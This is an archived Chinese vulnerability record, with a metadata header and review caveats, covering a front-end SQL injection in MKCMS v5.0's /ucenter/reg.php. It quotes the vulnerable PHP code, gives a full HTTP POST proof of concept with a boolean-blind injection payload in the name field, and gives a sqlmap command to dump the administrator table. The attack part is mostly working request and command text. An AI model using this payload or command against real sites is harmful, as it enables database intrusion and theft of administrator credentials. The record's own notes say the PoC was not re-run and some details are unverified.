---
source: "hatch 补库批 20260928"
product: "MKCMS5.0"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "MKCMS v5.0 _ucenter_reg.php前台注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：公开注册端点/旧mysql扩展"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-b470a607e5a14a7da4558602"
entity_id: "ve-b470a607e5a14a7da4558602"
schema_version: "1"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：公开注册端点/旧mysql扩展

- **事实待核（1）**：与242KCMS5.0同文同请求同来源，此处产品MKCMS与表名前缀一致，242疑漏M。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：本篇少管理员结果截图，合并时择全资源；同样Content-Length52与更长正文不匹配、缺真假对照。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# MKCMS v5.0 /ucenter/reg.php前台sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

MKCMS v5.0

三、复现过程
------------

漏洞出现在`/ucenter/reg.php`第7-19行:

    if(isset($_POST['submit'])){
    $username = stripslashes(trim($_POST['name']));
    // 检测用户名是否存在
    $query = mysql_query("select u_id from mkcms_user where u_name='$username'");
    if(mysql_fetch_array($query)){
    echo '<script>alert("用户名已存在，请换个其他的用户名");window.history.go(-1);</script>';
    exit;
    }
    $result = mysql_query('select * from mkcms_user where u_email = "'.$_POST['email'].'"');
    if(mysql_fetch_array($result)){
    echo '<script>alert("邮箱已存在，请换个其他的邮箱");window.history.go(-1);</script>';
    exit;
    }

注册用户名时`$username`参数传到后台后经过`stripslashes()`函数处理，而`stripslashes()`函数的作用是删除`addslashes()`
函数添加的反斜杠。这里就很郁闷了，过滤反斜杠干嘛？

当前页面无输出点，只是返回一个注册/未注册（通过if判断true或者false)，可以使用布尔盲注来解决这个问题

POC：

    POST /ucenter/reg.php HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en
    Accept-Encoding: gzip, deflate
    Referer: http://127.0.0.1/ucenter/reg.php
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 52
    Connection: close
    Cookie: PHPSESSID=cb8e6ccde6cf9050972fa9461d606be3
    Upgrade-Insecure-Requests: 1

    name=test' AND 1=1 AND 'inject'='inject&email=sss%40qq.com&password=ssssss&submit=

![](./.resource/MKCMSv5.0_ucenter_reg.php前台注入漏洞/media/rId24.jpg)

将POC中的数据包保存下来丢给sqlmap跑即可。

获取管理员账号：

    sqlmap -r inject.txt -D mkcms -T mkcms_manager --dump

参考链接
--------

> https://xz.aliyun.com/t/4189\#toc-1
